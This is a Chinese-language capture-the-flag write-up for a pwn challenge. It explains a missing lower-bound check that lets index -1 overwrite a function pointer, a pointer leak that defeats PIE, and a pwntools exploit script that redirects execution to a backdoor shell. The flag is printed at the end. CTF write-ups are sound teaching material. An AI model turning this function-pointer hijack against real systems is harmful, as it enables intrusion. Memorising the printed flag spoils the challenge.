# 小蜜蜂 (200分)

## 漏洞分析

### 第一步：漏洞定位（静态分析）

- 在选项2内只检查了上界，未检查下界。

###### 关键代码片段（选项2）：

```c
case 2LL:
        printf("Which shelf slot should be updated? ");
        n7 = read_index();                              //用户输入索引
        if ( n7 <= 7 )                                  //只检查上界未检查下界
        {
          printf("What pickup code should be written there? ");
          v6[n7] = read_pickup_code();                  //数组越界写
          puts("The clerk writes it down.");
        }
```

- 栈布局：

| 变量名 | 位置（相对于rbp） | 大小 |
|-------|------------------|------|
| p_p_ordinary_bell |[rbp-0x50]|8字节|
| v6[0] |[rbp-0x48]|8字节|
| v6[1] |[rbp-0x40]|8字节|
| v6[2] |[rbp-0x38]|8字节|
| v6[3] |[rbp-0x30]|8字节|
| v6[4] |[rbp-0x28]|8字节|
| v6[5] |[rbp-0x20]|8字节|
| v6[6] |[rbp-0x18]|8字节|
| v6[7] |[rbp-0x10]|8字节|

```c
    __int64 n4; // rax
    void (*p_p_ordinary_bell)(void); // [rsp+0h] [rbp-50h] BYREF
    _QWORD v6[8]; // [rsp+8h] [rbp-48h]
    __int64 n7; // [rsp+48h] [rbp-8h]
```

相关代码👆

**关键结论**：
- `v6[-1]`的地址=`[rbp-0x48]-8`=`[rbp-0x50]`,即恰好指向`p_p_ordinary_bell`函数指针
- 因此，输入索引`-1`可以**精确覆盖**这个函数指针，而不影响其他内存。

### 第二步：信息泄露（绕过PIE）

###### 关键代码片段（选项1）

```c
int __fastcall show_records(const void **p_p_ordinary_bell)
{
  int result; // eax
  unsigned __int64 n7; // [rsp+18h] [rbp-8h]

  result = printf("duty bell handler: %p\n", *p_p_ordinary_bell);
  for ( n7 = 0; n7 <= 7; ++n7 )
    result = printf("slot[%zu] => %lu\n", n7, p_p_ordinary_bell[n7 + 1]);
  return result;
}
```
##### 它做了什么：
- 直接打印了`p_p_ordinary_bell`的运行时地址，这是一个有效的 64 位指针。
- 由于程序开启了 PIE（地址随机化），我们无法直接使用 IDA 中看到的偏移地址，但`printf`泄露的地址可以让我们计算出程序加载基址。

###### 附上checksec
 ![alt text](../../images/little-bee_checksec.png)

##### 计算方式：
- 在 IDA 中查到`ordinary_bell`函数的偏移为`0x138E`。
- 泄露的地址 `leaked_addr`减去 `0x138E`，即得到程序加载基址`base`。
- 然后 `staff_room`（后门）的运行时地址=`base`+`0x13A8`。

## 利用思路

1. **选择菜单 1**: 获取 `p_p_ordinary_bell` 的运行时地址。
2. **计算后门地址**: `staff_addr = leaked_addr - 0x138E + 0x13A8`。
3. **选择菜单 2**： 
    -  输入索引 `-1`，这会选中 `v6[-1]`，即函数指针 `p_p_ordinary_bell`。
    -  输入提货码：填入计算出的 `staff_addr`（十进制或十六进制，取决于 `read_pickup_code` 的解析方式）。
4. **选择菜单 3**:程序调用 `p_p_ordinary_bell()`，实际执行 `staff_room()` → `execve("/bin/sh")`。


## Exploit 脚本

```py
from pwn import *

r = remote('ip', port)

# 1. 泄露地址
r.sendlineafter(b"> ", b"1")
r.recvuntil(b"duty bell handler: ")
leaked = int(r.recvline().strip(), 16)

# 2. 计算后门地址
ORDINARY_BELL_OFFSET = 0x138E
STAFF_ROOM_OFFSET = 0x13A8
base = leaked - ORDINARY_BELL_OFFSET
staff_addr = base + STAFF_ROOM_OFFSET

# 3. 覆盖函数指针
r.sendlineafter(b"> ", b"2")
r.sendlineafter(b"updated? ", b"-1")
r.sendlineafter(b"there? ", str(staff_addr).encode())

# 4. 触发后门
r.sendlineafter(b"> ", b"3")

r.interactive()
```

## Flag

moectf{Negative_index_Writes_Back_into_The_Desk}(非leet版)

## 一句话总结：
> 这是一个 **菜单型 Pwn 题**，漏洞点在菜单选项 2 的**数组越界写**，配合选项 1 的信息泄露绕过 PIE，最终劫持函数指针拿到 Shell。